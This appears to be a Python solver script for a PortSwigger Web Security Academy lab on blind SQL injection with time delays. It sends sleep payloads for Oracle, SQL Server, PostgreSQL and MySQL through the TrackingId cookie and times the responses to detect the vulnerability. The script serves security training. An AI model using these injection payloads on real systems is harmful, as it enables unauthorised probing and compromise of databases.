import requests
import argparse
import time

parser = argparse.ArgumentParser(description='Solves the following Lab: Blind SQL injection with time delays')
parser.add_argument('--id', action='store', help='lab ID, ex: 0a6e00ec03ca2e848083672100ee00fb', required=True)
lab = parser.parse_args()

r = requests.get("https://" + lab.id + f".web-security-academy.net/login")
session = r.cookies.get("session")
request_time = 0
statements = {
    'Oracle': "dbms_pipe.receive_message(('a'),10)",
    'Microsoft': "WAITFOR DELAY '0:0:10'",
    'PostgreSQL': "SELECT pg_sleep(10)",
    'MySQL': "SELECT SLEEP(10)"
}

for i in statements.values():
    send_time = time.time()
    r = requests.get("https://" + lab.id + f".web-security-academy.net/login", headers={'Cookie':f'TrackingId=\'||({i})-- -'})
    print(f'\'|| ({i})-- -')
    response_time = time.time()
    request_time = response_time - send_time
    print(f"Request time: {request_time}")
    if request_time >= 9.9:
        break

try:
    assert('<p>Solved</p>' in requests.get("https://" + lab.id + ".web-security-academy.net/").text)
    print('Lab solved.')
except Exception:
    print("Error while trying to solve the lab.")